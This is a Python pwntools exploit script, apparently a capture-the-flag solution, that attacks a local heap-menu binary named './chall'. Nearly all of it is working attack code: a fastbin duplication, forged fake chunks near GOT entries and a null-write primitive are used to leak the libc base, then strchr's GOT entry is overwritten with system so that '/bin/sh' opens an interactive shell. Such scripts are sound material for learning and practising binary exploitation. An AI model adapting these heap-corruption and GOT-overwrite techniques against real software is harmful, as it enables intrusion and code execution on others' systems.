from pwn import *

def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(index, size, data):
    io.sendlineafter("> ", "1")
    io.sendlineafter(": ", str(index))
    io.sendlineafter(": ", str(size))
    io.sendafter(": ", data)


@debug
def edit(index, size, data):
    io.sendlineafter("> ", "2")
    io.sendlineafter(": ", str(index))
    io.sendlineafter(": ", str(size))
    if size > 0:
        io.sendafter(": ", data)


@debug
def delete(index):
    io.sendlineafter("> ", "3")
    io.sendlineafter(": ", str(index))

binpath = './chall'
elf = ELF(binpath)
libc = elf.libc
context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
addr_fake_chunk = 0x60208d
gdbscript = '''
gef
b *0x0000000000400CB1
'''
while True:
    # io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
    io = process(binpath)
    # fastbin dup
    add(0, 0x68, "A")
    add(1, 0x68, "B")
    edit(0, 0x00, "")
    delete(1)
    delete(0)
    add(0, 0x68, p64(addr_fake_chunk))
    add(1, 0x68, "A"*0x10) # consume (consolidate)
    edit(1, 0x78, "B"*0x10)
    delete(1)
    add(1, 0x68, "C"*0x10) # consume (swap)
    edit(1, 0x78, "D"*0x10)
    delete(1)
    add(1, 0x68, "E"*0x10) # consume (consolidate)
    edit(1, 0x78, "F"*0x10)
    delete(1)
    # null write primitive at arbitrary address
    for i in range(5):
        payload = b'\0' * 3
        payload += p64(elf.got['puts']) + p64(0x21) # stdin (used later)
        payload += p64(elf.symbols['ptr']) + p64(elf.got['alarm'] + i - 0x33)
        payload += p64(0) + p64(0x21)
        payload += p64(0) + p64(elf.got['strchr'] - 8) # ptr[5] (used later)
        add(1, 0x68, payload) # write 0x00!
        # now index 0 points to the pointer list
        edit(0, 0x18, p64(elf.symbols['ptr']) + p64(0))
        if i < 4:
            fake_chunk  = p64(0) + p64(0x71)
            fake_chunk += p64(addr_fake_chunk)
            add(1, 0x78, fake_chunk) # fake chunk
            edit(1, 0x00, "")
            edit(0, 0x18, p64(elf.symbols['ptr']) + b'\xa0')
            delete(1)
            if b'/home' in io.recv(8): # segfault
                logger.warn("Bad luck!")
                break
            add(1, 0x78, fake_chunk) # overlaps, forge fd
            delete(1)
            add(1, 0x68, "dummy")
            edit(0, 0x18, p64(elf.symbols['ptr']) + p64(0))
    else:
        break
# now fake size (0x7f) is at 0x60203d (alarm@got-11)
fake_chunk  = p64(0) + p64(0x71)
fake_chunk += p64(elf.got['alarm'] - 11)
add(1, 0x78, fake_chunk)
edit(1, 0x00, "")
edit(0, 0x18, p64(elf.symbols['ptr']) + b'\xa0')
delete(1)
add(1, 0x78, fake_chunk) # overlaps, forge fd
delete(1)
add(1, 0x68, "dummy")
edit(0, 0x18, p64(elf.symbols['ptr']) + p64(0))
# got overwrite
payload = b'\0' * 3
payload += p64(elf.plt['read'] + 6)
payload += p64(0x400a8f)             # signal
payload += p64(elf.plt['malloc'] + 6)
payload += p64(elf.plt['realloc'] + 6)
payload += p64(elf.plt['puts'] + 6)  # setvbuf
payload += p64(elf.symbols['_start']) # atoi
add(1, 0x68, payload[:-1])
# libc leak
io.sendafter("> ", "X\0")
libc_base = u64(io.recvline()) - libc.symbols['puts'] # puts(stdin)
io.recvline() # puts(stdout)
logger.info("libc = " + hex(libc_base))
# got overwrite
"""
lea rcx, [rax*8]     <--- rax=5 because puts(stdout) was called
lea rax, ptr
mov rax, [rcx + rax] <-- ptr[5]
mov rsi, rax
lea rdi, "data: "
call readline
"""
payload = b'/bin/sh\0'
payload += p64(libc_base + libc.symbols['system']) # strchr
io.sendafter(": ", payload)
io.interactive()
